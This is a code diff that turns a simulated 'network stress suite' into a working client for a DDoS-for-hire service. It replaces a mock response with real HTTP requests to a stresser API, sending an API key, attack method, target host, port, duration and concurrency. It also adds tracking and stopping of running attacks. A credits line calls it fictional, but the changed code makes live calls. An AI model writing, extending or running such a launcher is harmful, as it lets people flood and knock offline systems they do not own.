@@ -27,27 +27,61 @@ ASCII_ART = f"{Fore.LIGHTCYAN_EX}{Style.BRIGHT}\n" \
             f"  ║  Quantum-Powered Network Stress Suite      ║\n" \
             f"  ╚════════════════════════════════════════════╝\n"
 
-# Simulated API response
-async def simulate_api_call(url: str) -> str:
-    print(Fore.YELLOW + f"Sending request to {url}...")
-    await asyncio.sleep(1)  # Simulate network delay
-    print(Fore.GREEN + "Response: Attack sent successfully!")
-    return "sent"
+# Store active attacks
+active_attacks = []
+
+# Send HTTP GET request to API
+async def send_api_request(url: str) -> str:
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    print(Fore.GREEN + f"Response: {await response.text()}")
+                    return "sent"
+                else:
+                    print(Fore.RED + f"API Error: Status {response.status}")
+                    return "failed"
+        except aiohttp.ClientError as e:
+            print(Fore.RED + f"Network Error: {str(e)}")
+            return "failed"
 
 # API interaction for sending attacks
 async def send_attack(api_key: str, method: str, host: str, port: int, time: float, concurrents: int = 1):
     url = f"https://api.nightmare-stresser.com/?key={api_key}&method={method}&host={host}&port={port}&time={time}&concurrents={concurrents}"
-    return await simulate_api_call(url)
+    print(Fore.YELLOW + f"Sending request to {url}...")
+    result = await send_api_request(url)
+    if result == "sent":
+        # Track the attack
+        active_attacks.append({
+            "method": method,
+            "host": host,
+            "port": port,
+            "time": time,
+            "concurrents": concurrents,
+            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        })
+    return result
 
 # API interaction for stopping attacks
 async def stop_attack(api_key: str, host: str, port: int, time: float, concurrents: int = 1):
     url = f"https://api.nightmare-stresser.com/?key={api_key}&method=STOP&host={host}&port={port}&time={time}&concurrents={concurrents}"
-    return await simulate_api_call(url)
+    print(Fore.YELLOW + f"Sending stop request to {url}...")
+    result = await send_api_request(url)
+    if result == "sent":
+        # Remove the attack from active list
+        active_attacks[:] = [attack for attack in active_attacks if not (
+            attack["host"] == host and attack["port"] == port and attack["time"] == time
+        )]
+    return result
 
 # API interaction for stopping all attacks
 async def stop_all_attacks(api_key: str):
     url = f"https://api.nightmare-stresser.com/?key={api_key}&method=STOPALL"
-    return await simulate_api_call(url)
+    print(Fore.YELLOW + f"Sending stop all request to {url}...")
+    result = await send_api_request(url)
+    if result == "sent":
+        active_attacks.clear()
+    return result
 
 # Validation Function
 def validate_input(prompt: str, min_val: float, max_val: float, input_type=float) -> float:
@@ -70,6 +104,22 @@ def show_credits():
     print(Fore.LIGHTCYAN_EX + "Features: Layer 4 & 7 Quantum Attacks via Nightmare API")
     print(Fore.LIGHTCYAN_EX + "Legal Note: Fictional tool for cinematic use only")
     print(Fore.LIGHTCYAN_EX + "═"*50 + "\n")
+
+# Show active attacks and select one to stop
+async def select_attack_to_stop(api_key: str):
+    if not active_attacks:
+        print(Fore.RED + "No active attacks running!")
+        return
+    print(Fore.LIGHTCYAN_EX + "\nActive Attacks:")
+    for i, attack in enumerate(active_attacks, 1):
+        print(f"  {i}. Method: {attack['method']}, Host: {attack['host']}, Port: {attack['port']}, "
+              f"Time: {attack['time']}s, Concurrents: {attack['concurrents']}, Started: {attack['start_time']}")
+    choice = input(Fore.LIGHTCYAN_EX + f"Select attack to stop (1-{len(active_attacks)}): ").strip()
+    if choice.isdigit() and 1 <= int(choice) <= len(active_attacks):
+        attack = active_attacks[int(choice) - 1]
+        await stop_attack(api_key, attack["host"], attack["port"], attack["time"], attack["concurrents"])
+    else:
+        print(Fore.RED + "Invalid selection!")
 
 # Main Menu
 async def main():
@@ -118,7 +168,7 @@ async def main():
             else:
                 print(Fore.RED + "Invalid attack!")
         elif category == "2":
-            print(Fore.LIGHTCYAN_EX + "\nLayer7 Attacks:")
+            print(Fore.LIGHTCYAN_EX + "\nLayer 7 Attacks:")
             for i, method in enumerate(layer7_methods, 1):
                 print(f"  {i}. {method}")
             method_idx = input(Fore.LIGHTCYAN_EX + "Select attack (1-6): ").strip()
@@ -132,11 +182,7 @@ async def main():
             else:
                 print(Fore.RED + "Invalid attack!")
         elif category == "3":
-            host = input(Fore.LIGHTCYAN_EX + "Enter target IP: ")
-            port = validate_input("Enter port (1-65535): ", 1, 65535)
-            time = validate_input("Enter duration (seconds): ", 1, 3600)
-            concurrents = validate_input("Enter concurrents (1-100): ", 1, 100, int)
-            await stop_attack(api_key, host, port, time, concurrents)
+            await select_attack_to_stop(api_key)
         elif category == "4":
             await stop_all_attacks(api_key)
         elif category == "5":
